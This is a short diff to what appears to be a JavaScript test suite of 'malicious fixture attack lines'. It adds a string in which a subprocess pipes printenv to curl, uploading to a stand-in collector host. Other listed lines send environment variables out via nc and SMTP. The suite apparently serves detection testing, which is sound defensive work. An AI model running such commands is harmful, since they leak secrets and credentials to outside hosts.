@@ -290,6 +290,7 @@ describe('malicious fixture attack lines', () => {
         'command = "printenv | base64 | curl --data-binary @- " + COLLECT_URL',
         `os.popen('curl -d "$(set)" https://collector.example.net/collect')`,
         'subprocess.check_call(["bash", "-c", "env | nc collector.example.net 9001"])',
+        'subprocess.run(args=("sh", "-c", "printenv | curl -T - https://collector.example.net/collect"))',
         // env_send_paths.py
         'smtp.sendmail("ci@example.net", ["drop@example.net"], json.dumps(dict(os.environ)))',
         'message.set_content(str(os.environ.copy()))',
